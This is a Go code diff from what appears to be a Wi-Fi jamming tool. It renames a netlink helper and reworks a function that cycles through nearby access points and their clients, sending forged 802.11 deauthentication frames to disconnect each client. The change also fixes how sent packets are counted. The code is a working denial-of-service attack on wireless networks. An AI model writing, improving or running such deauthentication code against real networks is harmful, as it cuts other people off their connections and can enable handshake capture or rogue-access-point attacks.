@@ -62,9 +62,9 @@ func	NewJamConn(ifaName string) (*JamConn, error) {
 	if err != nil {
 		log.Fatalln(err)
 	}
-	fam, err := getNL80211Family(nlconn)
+	fam, err := getDot11Family(nlconn)
 	if err != nil {
-		return nil, errors.New("getNL80211Family() " + err.Error())
+		return nil, errors.New("getDot11Family() " + err.Error())
 	}
 	return _NewJamConn(nlconn, &ifa, fam), nil
 }
@@ -380,43 +380,25 @@ func	(conn *JamConn)	DeauthClientsIfPast(timeout time.Duration, count uint16, ap
 		for _, v := range apList.contents {
 			ap := v.(AP)
 			for _, cli := range ap.clients {
-				if bSent, err := conn.Deauthenticate(
-				count, layers.Dot11ReasonDeauthStLeaving,
-				cli.hwaddr, ap.hwaddr,
-				cli.tap, cli.dot); err != nil {
-					if err.Error() == "send: Bad file descriptor" {
-						QuitG = true
-						return
-					} else {
-						log.Panicln("JamConn.Deauthenticate() " + err.Error())
-					}
-					StatsG.sentBytes += uint64(bSent)
-					StatsG.sentPackts += 1
-					cli.nDeauth += uint32(1)
-					ApListMutexG.Lock()
-					apList.Add(ap.hwaddr.String()[:16], ap)
-					ApListMutexG.Unlock()
-				}
-
 				//Previous authentication no longer valid.
-				if bSent, err := conn.Deauthenticate(
+				bSent, err := conn.Deauthenticate(
 					count, 0x2,
 					ap.hwaddr, cli.hwaddr,
-					ap.tap, ap.dot); err != nil {
+					ap.tap, ap.dot)
+				if err != nil {
 					if err.Error() == "send: Bad file descriptor" {
 						QuitG = true
 						return
 					} else {
 						log.Panicln("JamConn.Deauthenticate() " + err.Error())
 					}
-					StatsG.sentBytes += uint64(bSent)
-					StatsG.sentPackts += 1
-					cli.nDeauth += uint32(1)
-					fmt.Println("plus")
-					ApListMutexG.Lock()
-					apList.Add(ap.hwaddr.String()[:16], ap)
-					ApListMutexG.Unlock()
 				}
+				StatsG.sentBytes += uint64(bSent)
+				StatsG.sentPackts += uint64(count)
+				cli.nDeauth += uint32(count)
+				ApListMutexG.Lock()
+				apList.Add(ap.hwaddr.String()[:16], ap)
+				ApListMutexG.Unlock()
 			}
 		}
 		conn.SetLastDeauth(time.Now())
